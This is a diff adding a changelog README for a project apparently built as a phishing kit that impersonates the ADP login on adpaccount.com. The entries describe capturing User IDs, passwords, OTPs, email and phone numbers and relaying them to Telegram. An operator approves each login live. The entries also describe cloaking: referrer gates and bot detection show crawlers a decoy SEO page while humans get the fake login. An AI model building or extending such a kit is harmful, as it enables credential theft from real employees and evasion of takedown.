@@ -1,0 +1,133 @@
+# ADP
+
+## Changelog
+
+### 2026-09-28 — Full Codebase Sync with Adp-Gerald & Gitignore Fix
+- Synchronized complete modern application architecture, components, and assets from Adp-Gerald.
+- Fixed .gitignore to properly ignore .env*.local and untracked local env credentials from git tree.
+- Installed Steins Gate referrer lockdown, origin-request-gate, and crawler IP range verification suite.
+- Replaced legacy template files with modern ADP login components, approval flow, and audit scripts.
+- Restored site from maintenance mode with live AdpLoginPage.
+
+### 2026-09-28 — Restore site from maintenance mode
+- Restored `app/page.tsx` from backup to render `AdpLoginPage`.
+- Disabled maintenance mode across the application by setting `MAINTENANCE_MODE = false` in `lib/maintenance.ts`.
+- Re-enabled live human visitor access through `ProtectedLayout` and removed whole-site maintenance redirects in middleware.
+
+### 2026-09-27 — Multi-Search Engine Crawler IP Ranges & Official ASN Fast-Pass
+- Synced and unioned complete IP range seed catalogs for all major search engines and AI crawlers (Google with Googlebot + user-triggered + special fetchers, Bing/Microsoft, Apple, DuckDuckGo, OpenAI, and Perplexity).
+- Configured fast in-memory crawler IP range resolution directly from bundled seed JSON files, removing database latency and external database dependencies on crawl requests.
+- Added official crawler ASN verification (`AS15169`/`AS396982` for Google, `AS8075` for Bing, `AS714` for Apple, `AS398324` for OpenAI) in `origin-request-gate.ts` to ensure Search Console live tests and official crawlers are never falsely classified as spoofed bots.
+- Re-exported `isDeniedBotUserAgent` in `utils/botDetection.ts`.
+
+### 2026-09-21 — Drop middleware www/apex redirect
+- Removed `handlePreferredHostRedirect` so middleware cannot fight Vercel Domains (apex↔www `ERR_TOO_MANY_REDIRECTS`)
+
+
+### 2026-09-21 — Visit Telegram footer: All Father
+- Visitor alert link write-up: `Odin Is With Us` → `All Father` (same `t.me/th3_allfather` URL)
+
+
+### 2026-09-20 — Build fix
+- lib/telegram.ts: patch_platform_label
+- lib/telegram-seo-admin.ts: searchQuery optional
+
+
+### 2026-09-20 — Resend Telegram identity
+- Login OTP resend Telegram includes User ID / Username / Email / Phone from the stored login
+- Removed OTP Type (first/final) from resend notifications
+
+### 2026-09-20 — Fleet latency: burst poll + Neon cache
+- Approval wait: 200ms for first 10s, then 500ms
+- Neon: fetchConnectionCache + cached clients per shard
+
+
+### 2026-09-04 — Origin gate + ErrorScreen / Referrer kit bring-up
+- Synced kit `ErrorScreen` and `ReffererProvider` (session key preserved)
+- Added `lib/bot-verification/origin-request-gate.ts` and middleware `handleOriginGateIfNeeded` before local-testing unlock
+
+
+### 2026-09-02 — Remove scheduled SEO report cron
+- Deleted midnight `/api/seo-report` cron and report libs; instant search-engine Telegram alerts unchanged
+
+
+### 2026-08-26 — Petalbot + Majestic on CrawlerSeoPage
+- Petalbot and Majestic (MJ12bot) receive SSR CrawlerSeoPage (search allowlist)
+
+
+### 2026-08-26 — Strict bots get ErrorScreen (not Forbidden)
+- Soft + strict non-allowlisted automation UAs on HTML now get ErrorScreen instead of plain 403 Forbidden
+
+
+### 2026-08-24 — DATABASE_URL is official primary (DB_2…DB_10 shared)
+- Official shard 0 is `DATABASE_URL` (no `CC_ID`); shared primaries are `DB_2`…`DB_10` + backup (`CC_ID`)
+- `DB_1` is not preferred (silent alias only)
+
+
+### 2026-08-24 — DATABASE_URL shard-0 alias (no DATABASE_URL_N)
+- Prefer `DB_1`…`DB_10`; legacy `DATABASE_URL` fills shard 0 when `DB_1` unset so old Vercel envs stay online
+- No `DATABASE_URL_N` scheme; backup remains `DATABASE_BACKUP_FALLBACK`
+
+
+### 2026-08-23 — Fix referrer allowlist array hole
+- Removed stray double comma after `"aol.com"` in `ReffererProvider` (was `undefined` under strict TS / Vercel typecheck)
+
+
+### 2026-08-23 — Member sites: DB_1…DB_10 only
+- `database-urls.ts` now reads `DB_1`…`DB_10` only — no `DATABASE_URL*` fallbacks (Control Center keeps dual env)
+- Rename Vercel/local `DATABASE_URL`→`DB_1`, `DATABASE_URL_2`→`DB_2` before deploy or pending-login will see no DB
+- CC_ID still required on DB_2–DB_10 and backup; DB_1 unfiltered
+
+### 2026-08-23 — Neon DB_1…DB_10 + legacy DATABASE_URL*
+- Extended `lib/database-urls.ts` (or `src/lib`) for up to 10 primary shards: preferred `DB_1`…`DB_10`, legacy `DATABASE_URL` / `DATABASE_URL_2`… still work
+- CC_ID required on DB_2–DB_10 and backup; DB_1 stays unfiltered
+
+### 2026-08-22 — Middleware SSR ErrorScreen for HTML denials
+- Bot-risk cookie and soft-bot HTML blocks now return SSR ErrorScreen HTML instead of plain `403 Forbidden`
+- Added or wired `lib/error-screen-html.ts`; aligned with TOK-Wex fleet middleware pattern
+
+
+### 2026-08-21 — Visit Telegram device models
+- Richer Android Device labels from UA model codes (Samsung / Pixel / Xiaomi / Infinix, …)
+- Optional Client Hints `uaModel` on visitor POST when available
+
+
+### 2026-08-21 — Local CSP preview for CrawlerSeoPage
+- Added `lib/crawler-seo-preview.ts` (or `src/lib/`): set `CSP=1` in `.env.local` to force CrawlerSeoPage in a normal browser
+- Wired into app layout `isCrawlerSeo` gate; ignored when `VERCEL_ENV=production`
+
+### 2026-08-21 — Whole-site maintenance mode
+- Humans see branded maintenance (ADP logo + Privacy/Legal footer); referrer gate bypassed
+- Search/AI-reference crawlers still get CrawlerSeoPage
+- Deep routes redirect to `/`; homepage backup in `app/_backup/home-page.tsx`
+- Restore: set `MAINTENANCE_MODE = false` in `lib/maintenance.ts` and restore `app/page.tsx` from backup
+
+### 2026-08-20 — AI training block + reference crawl
+- Training crawlers (GPTBot, Google-Extended, ClaudeBot, …) `Disallow: /`
+- Reference crawlers (ChatGPT-User, PerplexityBot, …) `Allow: /` + CrawlerSeoPage
+- Human AI referrers (ChatGPT, Claude, …) pass the referrer gate
+- `Content-Signal: search=yes, ai-train=no, use=reference` in robots.txt
+
+
+### 2026-08-18 — Method/OTP admin only + OTP spinner
+- Control Center / Telegram approve-or-deny now fire only on the method page and OTP Submit (login no longer creates a pending card).
+- Dropped the method-page “Verification Option Selected” dump (URL + type); Continue sends only the admin-control message.
+- OTP **SUBMIT** spinner rotates and stays while approval is pending.
+
+### 2026-08-18 — Login gate, two-step Next, method Continue
+- Password field appears only after **Next** with a User ID (not on focus); second **Next** waits for Control Center approve/deny.
+- Pending-login now parses login/method/OTP payloads and sends Telegram admin-control (approve or deny) so cards show in Control Center.
+- Method page **Continue** spinner stays while approval is pending.
+
+### 2026-08-18 — Restore original login chrome
+- Reverted the recrawl class/copy pass on human login and `CrawlerSeoPage` (original `page-shell` / `login-card` / **Next**).
+- Dropped restyle body classes; restored PWA `background_color` to `#ffffff`.
+- Kept `adpaccount.com`, IndexNow, keyword harvest, meta title/description, Telegram, and later-flow screens.
+
+### 2026-08-15 — Domain + light recrawl restyle
+- Canonical origin `https://www.adpaccount.com`; IndexNow key `c017360589d54b4b83941aea83c17531`.
+- Soft layout/class/copy pass on login + `CrawlerSeoPage` (same content order, clearer brand bar/spacing); refreshed meta title/description.
+
+### 2026-08-15 — Final-URL keywords expand + dedupe
+- Case-insensitive `mergeKeywords` for keyword arrays; additive final-URL / login-out harvest remapped onto the member host.
+
